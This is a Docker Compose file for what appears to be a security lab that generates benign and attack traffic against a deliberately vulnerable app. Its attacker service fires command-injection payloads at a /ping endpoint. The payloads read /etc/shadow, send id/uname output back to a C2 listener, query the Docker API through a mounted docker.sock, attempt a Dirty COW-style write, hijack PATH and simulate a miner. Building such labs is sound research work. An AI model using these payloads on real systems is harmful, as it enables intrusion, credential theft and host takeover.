services:
  vuln-app:
    image: deploy-vuln-app:latest
    container_name: drsec-target
    volumes:
      - ./vuln_app/app.py:/app/app.py:ro
      - drsec-app-data:/app/data
    networks:
      - drsec-net

  benign-client:
    image: curlimages/curl:8.6.0  # 轻量级curl镜像，发送HTTP请求
    container_name: drsec-benign-client
    profiles: ["benign"]
    depends_on:  # 依赖vuln-app启动完成
      - vuln-app
    command:  # 循环执行120次正常用户操作
      - sh
      - -lc
      - "for i in $(seq 1 120); do TOKEN=$(curl -s -H 'Content-Type: application/json' -d '{\"username\":\"alice\",\"password\":\"password\"}' 'http://vuln-app:5000/api/login' | sed -n 's/.*\"token\":\"\\([^\"]*\\)\".*/\\1/p'); curl -s 'http://vuln-app:5000/health' >/dev/null; curl -s 'http://vuln-app:5000/api/items' >/dev/null; curl -s 'http://vuln-app:5000/api/search?q=sku' >/dev/null; curl -s -H 'Content-Type: application/json' -d '{\"customer\":\"alice\",\"item\":\"sku-001\",\"quantity\":1}' 'http://vuln-app:5000/api/order' >/dev/null; if [ -n \"$$TOKEN\" ]; then curl -s -H \"Authorization: Bearer $$TOKEN\" 'http://vuln-app:5000/api/me' >/dev/null; curl -s -X POST -H \"Authorization: Bearer $$TOKEN\" 'http://vuln-app:5000/api/logout' >/dev/null; fi; sleep 0.2; done; sleep 5"
    networks:
      - drsec-net

  vuln-app-dsock:  # 启动另一个脆弱应用实例，但额外挂载宿主机的 /var/run/docker.sock（Docker 守护进程的 Unix 套接字）
    image: deploy-vuln-app:latest
    container_name: drsec-target-dsock
    profiles: ["attack"]
    volumes:
      - ./vuln_app/app.py:/app/app.py:ro
      - drsec-app-data-dsock:/app/data
      - /var/run/docker.sock:/var/run/docker.sock
    networks:  # 挂载 Docker Socket，命令注入漏洞的危害被放大（可攻击宿主机）
      - drsec-net

  c2-listener:  # 启动一个 C2 监听服务，监听 4444 端口，等待攻击指令
    image: deploy-vuln-app:latest
    container_name: drsec-c2
    profiles: ["attack"]
    command:  # 利用 app.py /ping 接口的命令注入漏洞，让容器主动连接到 C2 服务器，回传敏感数据
      - sh
      - -lc
      - "python - <<'PY'\nimport socket\ns=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen(1)\ns.settimeout(60)\ntry:\n  c,addr=s.accept()\n  data=c.recv(4096)\n  print('C2 received:', data.decode('utf-8','ignore'))\n  c.close()\nexcept Exception as e:\n  print('C2 listener timeout')\nPY\nsleep 2"
    networks:
      - drsec-net

  attacker:
    image: curlimages/curl:8.6.0  # 通过 curl 调用 app.py 的 /ping 接口，利用命令注入漏洞执行一系列攻击命令
    container_name: drsec-attacker
    profiles: ["attack"]
    depends_on:
      - vuln-app
      - vuln-app-dsock
      - c2-listener
    command:
    # 基础信息窃取：ip=127.0.0.1;whoami;uname -a;id;cat /etc/shadow → 拼接到 ping 命令后执行，读取系统敏感信息；
    # 反向 C2 通信：通过 Python socket 连接 c2-listener:4444，回传 id/uname -a 结果；
    # Docker Socket 攻击：访问 /var/run/docker.sock，调用 Docker API 获取版本信息（宿主机级攻击）；
    # Dirty COW 漏洞模拟：尝试修改系统文件，测试提权可能性；
    # 命令劫持：篡改 PATH 环境变量，替换 ping 为恶意脚本；
    # 挖矿行为模拟：执行 CPU 密集型循环，模拟加密挖矿
      - sh
      - -lc
      - "set -e; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;whoami;uname -a;id;cat /etc/shadow\" >/dev/null; sleep 1; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket,subprocess; s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(subprocess.check_output('id;uname -a',shell=True)); s.close()\\\"\" >/dev/null; sleep 1; curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /version HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(4096).decode('utf-8','ignore'))\\\"\" >/dev/null; sleep 1; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import mmap\\nf=open(\\\\\\'/etc/ld.so.cache\\\\\\',\\\\\\'rb\\\\\\')\\nm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)\\nok=True\\ntry:\\n m[0]=0\\nexcept Exception:\\n ok=False\\nm.close(); f.close(); print(\\\\\\'dirtycow_sim\\\\\\',ok)')\\\"\" >/dev/null; sleep 1; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;printf '#!/bin/sh\\necho hijacked > /tmp/hijack.txt\\necho PWNED\\n' > /tmp/ping; chmod +x /tmp/ping; PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ping -c 1 127.0.0.1\" >/dev/null; sleep 1; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import time\\nt=time.time()+15\\nx=0\\nwhile time.time()<t:\\n x=(x*1664525+1013904223) & 0xFFFFFFFF\\nprint(\\\\\\'miner_done\\\\\\')')\\\"\" >/dev/null; sleep 5"
    networks:
      - drsec-net

networks:
  drsec-net:
    driver: bridge

volumes:
  drsec-app-data:
  drsec-app-data-dsock:
